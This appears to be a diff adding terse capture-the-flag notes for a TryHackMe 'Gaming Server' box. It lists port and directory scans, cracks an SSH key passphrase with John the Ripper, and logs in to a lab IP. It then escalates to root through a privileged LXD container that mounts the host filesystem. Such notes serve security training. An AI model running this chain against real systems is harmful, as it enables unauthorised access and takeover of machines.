@@ -1,0 +1,33 @@
+nmap -sC -sV 127.0.0.1
+
+gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt
+gobuster dir -u http://127.0.0.1 -w /path/to/wordlist.txt -x php
+dirsearch -u http://127.0.0.1
+
+ssh2john secretKey > id_rsa.hash
+john --wordlist=dict.lst id_rsa.hash
+
+john --wordlist=../rockyou.txt id_rsa.hash 
+john --show id_rsa.hash  
+
+ssh -i secretKey john@10.10.218.145
+
+id 
+
+git clone https://github.com/saghul/lxd-alpine-builder.git
+sudo ./build-alpine
+
+python3 -m http.server
+
+
+lxc image import ./alpine-* --alias myimage
+lxc image list
+lxc init myimage image -c security.privileged=true
+lxc config device add image mydevice disk source=/ path=/mnt/root recursive=true
+lxc start image
+lxc exec image /bin/sh
+
+
+https://doct3rjohn.medium.com/tryhackme-gaming-server-ctf-184277c2a8f1
+https://yebberdog.medium.com/try-hack-me-gaming-server-walkthrough-e85dd5d94aa8
+https://www.infosecarticles.com/tryhackme-gaming-server-walkthrough/
